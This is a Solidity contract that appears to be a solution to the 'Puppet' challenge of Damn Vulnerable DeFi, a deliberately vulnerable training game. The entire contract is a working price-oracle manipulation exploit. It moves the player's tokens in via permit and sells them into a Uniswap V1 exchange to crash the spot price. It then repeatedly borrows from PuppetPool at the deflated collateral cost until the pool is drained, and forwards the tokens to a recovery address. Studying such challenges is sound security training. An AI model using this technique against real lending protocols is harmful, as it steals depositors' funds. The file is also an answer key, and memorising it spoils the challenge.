// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";

contract Solution {
    DamnValuableToken immutable token;
    IUniswapV1Exchange immutable exchange;
    uint256 immutable deadline;

    constructor(
        DamnValuableToken _token,
        PuppetPool _pool,
        IUniswapV1Exchange _exchange,
        address _recovery,
        uint256 _value,
        uint256 _deadline,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) payable {
        token = _token;
        exchange = _exchange;
        deadline = _deadline;
        _transferDVTFromPlayer(_value, _v, _r, _s);
        _getDVTFromPool(_pool);
        token.transfer(_recovery, token.balanceOf(address(this)));
    }

    function _transferDVTFromPlayer(uint256 _value, uint8 _v, bytes32 _r, bytes32 _s) internal {
        token.permit(msg.sender, address(this), _value, deadline, _v, _r, _s);
        token.transferFrom(msg.sender, address(this), _value);
    }

    function _getDVTFromPool(PuppetPool _pool) internal {
        token.approve(address(exchange), type(uint256).max);
        uint256 tokenAmount;
        uint256 poolToken;
        while (token.balanceOf(address(_pool)) > 0) {
            // sell all token to lower the price
            exchange.tokenToEthSwapInput(token.balanceOf(address(this)), 1, deadline);
            tokenAmount = _getTokenAmount();
            poolToken = token.balanceOf(address(_pool));
            tokenAmount = tokenAmount > poolToken ? poolToken : tokenAmount;
            _pool.borrow{value: _pool.calculateDepositRequired(tokenAmount)}(tokenAmount, address(this));
        }
    }

    function _getTokenAmount() internal view returns (uint256) {
        return address(this).balance * 1 ether / (2 * _price());
    }

    function _price() internal view returns (uint256) {
        return address(exchange).balance * (10 ** 18) / token.balanceOf(address(exchange));
    }

    // no need for the receive function, because all calls are from the constructor
}
